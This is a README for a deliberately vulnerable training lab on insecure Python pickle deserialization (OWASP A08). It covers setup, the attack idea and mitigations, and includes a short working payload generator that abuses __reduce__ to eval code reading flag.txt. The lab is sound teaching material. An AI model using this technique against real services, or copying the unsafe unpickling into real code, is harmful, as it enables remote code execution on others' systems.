# Software and Data Integrity Failures Lab

A hands-on demonstration of OWASP Top 10 A08:2025 "Software and Data Integrity Failures" - specifically, insecure deserialization vulnerabilities.

## The Vulnerability

The application accepts serialized Python objects (pickle format) and deserializes them **without any integrity verification**. Python's pickle module can execute arbitrary code during deserialization, making it extremely dangerous when processing untrusted data.

## How to Use

1. **Understand the vulnerability** - The app accepts base64-encoded pickle data and deserializes it without verification.
2. **Craft a malicious payload** - Create a pickle payload that executes code to read `flag.txt`.
3. **Submit the payload** - Base64 encode your malicious pickle and submit it through the form.
4. **Retrieve the flag** - The deserialized output will contain the flag from `flag.txt`.

## Running the Lab

### Docker (Recommended)

```bash
cd software-data-failures
docker build -t thm-integrity-lab .
docker run --rm -p 8002:8002 thm-integrity-lab
```

Then visit `http://localhost:8002`

### Local Python

```bash
cd software-data-failures
python -m venv .venv
. .venv/Scripts/activate        # PowerShell: .\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python app.py                   # listens on http://127.0.0.1:8002
```

## Learning Objectives

This lab demonstrates that:

1. **Unsafe deserialization is dangerous** - Pickle can execute arbitrary code during deserialization
2. **No integrity checks** - The app doesn't verify signatures, hashes, or data authenticity
3. **Trust boundary violation** - Untrusted user input is treated as if it came from a trusted source
4. **Code execution** - Attackers can achieve remote code execution through malicious serialized data

## Attack Vector

Python's pickle module uses the `__reduce__` method to reconstruct objects. Attackers can define a class with a malicious `__reduce__` method that executes arbitrary code when the object is deserialized.

## Example Payload Generation

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))

payload = pickle.dumps(Malicious())
print(base64.b64encode(payload).decode())
```

## Mitigation

- **Use safe serialization formats** - JSON, YAML (with `safe_load`), or MessagePack
- **Verify digital signatures** - Sign serialized data and verify signatures before deserializing
- **Whitelist allowed types** - Only deserialize known, safe object types
- **Use restricted unpicklers** - Implement custom unpicklers that restrict what can be deserialized
- **Never deserialize untrusted data** - If you must accept serialized data, ensure it comes from a trusted source
- **Use schema validation** - Validate data structure before deserialization

⚠️ **Warning:** This app intentionally uses vulnerable deserialization for educational purposes. Do **not** deploy in production.
